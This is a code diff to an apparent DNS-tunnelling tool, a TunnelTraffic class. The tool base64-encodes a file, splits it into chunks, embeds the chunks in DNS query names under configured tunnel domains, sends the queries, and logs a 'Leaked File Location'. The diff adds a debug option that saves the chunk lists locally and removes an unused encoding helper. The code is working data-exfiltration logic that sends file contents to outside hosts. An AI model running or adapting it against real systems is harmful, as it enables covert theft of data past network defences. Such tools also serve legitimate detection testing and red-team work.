@@ -129,27 +129,30 @@ class TunnelTraffic:
         encoded_text = encoded_text.decode()
         return encoded_text
 
-    def random_string_generator(self, encoded_file, params, length):
+    def random_string_generator(self, encoded_file, params, length, debug):
         string_list = []
+        raw_list = []
         encoded_file = encoded_file
         max_length = params["max_length"]
         min_length = params["min_length"]
-        all_data_char_count = len(encoded_file)
 
         while len(encoded_file) > length:
 
             length = length if "length" in params and params["length"] else random.randint(min_length, max_length)
             base_text = encoded_file[:length]
+            raw_list.append(base_text)
             string_list.append(self.encode_upper_case(base_text))
             encoded_file = encoded_file[length:]
 
         if len(encoded_file) >= 0:
             base_text = encoded_file
             string_list.append(self.encode_upper_case(base_text))
+            raw_list.append(base_text)
 
         string_list.append(self.encode_upper_case("ZmluaXNo"))
+        raw_list.append("ZmluaXNo")
 
-        return string_list
+        return string_list, raw_list
 
     def read_file_as_bytes_and_encrypt(self, file_name):
         encrypted_content = "None"
@@ -219,13 +222,26 @@ class TunnelTraffic:
 
         return encoded_file
 
-    def prepare_data(self, unique_string, params, encoded_file, file_name):
+    def prepare_data(self, unique_string, params, encoded_file, file_name, debug):
         domains = params["tunnel_domains"]
 
         length = params["max_length"]
 
-        string_list = self.random_string_generator(encoded_file, params, length)
+        string_list, raw_list = self.random_string_generator(encoded_file, params, length, debug)
         dns_request_list = []
+
+        if debug == 1:
+            f = open(f"{unique_string}_encoded_file.txt", "w")
+            f.write(encoded_file)
+            f.close()
+
+            f = open(f"{unique_string}_rawlist.txt", "w")
+            [f.write(l+"\n") for l in raw_list]
+            f.close()
+
+            f = open(f"{unique_string}_string_list.txt", "w")
+            [f.write(l+"\n") for l in string_list]
+            f.close()
 
         for i, item in enumerate(string_list):
             dns_request_list.append(unique_string + "-" + (str((i + 1) * 10)) + "-" + item + "." + domains[i % len(domains)])
@@ -244,7 +260,7 @@ class TunnelTraffic:
 
         return dns_request_list
 
-    def generate_traffic(self, params):
+    def generate_traffic(self, params, debug):
 
         file_path = params["file_path"]
 
@@ -260,29 +276,9 @@ class TunnelTraffic:
             unique_string = self.generate_unique_string()
             encoded_file = self.read_and_encode_base64_file(file_path)
 
-            data = self.prepare_data(unique_string, params, encoded_file, file_name)
+            data = self.prepare_data(unique_string, params, encoded_file, file_name, debug)
 
         return data, unique_string
-
-    def fix_file_encoding(self, params):
-        file_path = params["file_path"]
-
-        # Step 1: Detect the encoding of the file
-        with open(file_path, 'rb') as file:
-            raw_data = file.read()
-            result = chardet.detect(raw_data)
-            file_encoding = result['encoding']
-
-        print(f"Detected encoding: {file_encoding}")
-
-        # Step 2: Open the file with the detected encoding and read the content
-        with open(file_path, 'r', encoding=file_encoding) as file:
-            content = file.read()
-
-        # Step 3: Save the content in UTF-8 encoding
-        with open(file_path, 'w', encoding='utf-8') as file:
-            file.write(content)
-
 
 def argument_parsing():
     parser = argparse.ArgumentParser()
@@ -294,6 +290,7 @@ def argument_parsing():
     parser.add_argument("--timeout", required=False, help='timeout', type=float, default=1)
     parser.add_argument("--min_length", required=False, help='min fqdn length', type=int, default=18)
     parser.add_argument("--max_length", required=False, help='max fqdn length', type=int, default=20)
+    parser.add_argument("--debug", required=False, help='debug mode', type=int, default=0)
 
     args = parser.parse_args()
 
@@ -320,9 +317,7 @@ def main():
 
     logger("{}\n".format(params))
 
-    #tunnel_generator.fix_file_encoding(params)
-
-    data, unique_string = tunnel_generator.generate_traffic(params)
+    data, unique_string = tunnel_generator.generate_traffic(params, args.debug)
 
     tunnel_generator.send_dns_queries(params, data)
     logger(f"Leaked File Location: {unique_string}")
